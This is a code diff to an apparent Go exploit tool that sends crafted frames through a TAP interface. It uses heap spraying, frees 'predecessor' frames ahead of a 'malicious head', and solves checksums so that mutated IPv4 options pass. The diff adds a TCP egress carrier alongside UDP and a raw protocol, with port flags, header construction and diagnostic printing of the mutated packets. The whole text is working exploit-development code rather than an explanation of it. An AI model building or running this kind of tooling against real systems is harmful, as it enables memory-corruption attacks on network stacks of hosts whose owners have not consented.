@@ -73,6 +73,8 @@ type cfg struct {
 	transport    string
 	udpSrcPort   int
 	udpPort      int
+	tcpSrcPort   int
+	tcpPort      int
 	csumOffset   int
 	csumWord     uint
 }
@@ -99,9 +101,11 @@ func parseCfg() cfg {
 	egressFill := flag.Int("egress-spray-fill", 0xee, "payload byte stored in egress spray frames")
 	sprayDelayUS := flag.Int("spray-delay-us", 1000, "delay after predecessor frames, allowing them to be freed before the malicious head")
 	flag.BoolVar(&c.answerDstARP, "answer-dst-arp", false, "answer ARP for -dst so host-routed fragments hairpin back to this interface")
-	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp or raw253")
+	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp, tcp, or raw253")
 	flag.IntVar(&c.udpSrcPort, "udp-source-port", 0x0101, "UDP source port (also the first two post-mutation IPv4 option bytes)")
 	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
+	flag.IntVar(&c.tcpSrcPort, "tcp-source-port", 0x0100, "TCP source port (default bytes become NOP,END IPv4 options after mutation)")
+	flag.IntVar(&c.tcpPort, "tcp-port", 443, "destination port used by the TCP carrier")
 	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
 	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
@@ -151,16 +155,24 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
 		os.Exit(1)
 	}
-	if c.transport != "udp" && c.transport != "raw253" {
-		fmt.Fprintln(os.Stderr, "-egress-transport must be udp or raw253")
+	if c.transport != "udp" && c.transport != "tcp" && c.transport != "raw253" {
+		fmt.Fprintln(os.Stderr, "-egress-transport must be udp, tcp, or raw253")
 		os.Exit(1)
 	}
-	if c.transport == "udp" && c.head != 8 {
-		fmt.Fprintln(os.Stderr, "UDP egress transport requires -head 8")
+	if (c.transport == "udp" || c.transport == "tcp") && c.head != 8 {
+		fmt.Fprintln(os.Stderr, "UDP and TCP egress transports require -head 8")
 		os.Exit(1)
 	}
 	if c.udpSrcPort < 1 || c.udpSrcPort > 65535 || c.udpPort < 1 || c.udpPort > 65535 {
 		fmt.Fprintln(os.Stderr, "-udp-source-port and -udp-port must be in 1..65535")
+		os.Exit(1)
+	}
+	if c.tcpSrcPort < 1 || c.tcpSrcPort > 65535 || c.tcpPort < 1 || c.tcpPort > 65535 {
+		fmt.Fprintln(os.Stderr, "-tcp-source-port and -tcp-port must be in 1..65535")
+		os.Exit(1)
+	}
+	if c.transport == "tcp" && ((!c.egress && c.head+c.rest < 60) || (c.egress && c.head+c.egressRest < 60)) {
+		fmt.Fprintln(os.Stderr, "TCP egress transport requires at least 60 bytes of IPv4 payload")
 		os.Exit(1)
 	}
 	maxCsumOffset := ipLen + c.head - 2
@@ -270,17 +282,21 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 		payload[i] = 0x11
 	}
 	proto := byte(ipProtoRaw)
-	if c.transport == "udp" {
+	switch c.transport {
+	case "udp":
 		proto = ipProtoUDP
 		egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
-	} else {
+	case "tcp":
+		proto = ipProtoTCP
+		egressTCPHeaders(payload, uint16(c.tcpSrcPort), uint16(c.tcpPort))
+	default:
 		for i := 0; i < c.head; i++ {
 			payload[i] = marker
 		}
 	}
 	src := net.ParseIP("10.0.0.2").To4()
 	dst := net.ParseIP("10.99.0.2").To4()
-	if !egressSolve(payload, ipID, src, dst, proto, c.csumOffset, uint16(c.csumWord)) {
+	if !egressSolveAt(payload, ipID, src, dst, proto, c.csumOffset, uint16(c.csumWord), egressAdjustmentIPOffset(c.transport)) {
 		return nil, fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
 	}
 	if verbose {
@@ -342,6 +358,11 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 				fmt.Printf("  post-mutation udp src=%d dst=%d len=%d checksum=0x%04x\n",
 					binary.BigEndian.Uint16(udp[0:2]), binary.BigEndian.Uint16(udp[2:4]),
 					binary.BigEndian.Uint16(udp[4:6]), binary.BigEndian.Uint16(udp[6:8]))
+			} else if ip[9] == ipProtoTCP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+20 {
+				tcp := ip[ihl : ihl+20]
+				fmt.Printf("  post-mutation tcp src=%d dst=%d data_offset=%d flags=0x%02x checksum=0x%04x\n",
+					binary.BigEndian.Uint16(tcp[0:2]), binary.BigEndian.Uint16(tcp[2:4]),
+					tcp[12]>>4, tcp[13], binary.BigEndian.Uint16(tcp[16:18]))
 			}
 		}
 		host := extra[c.head:]
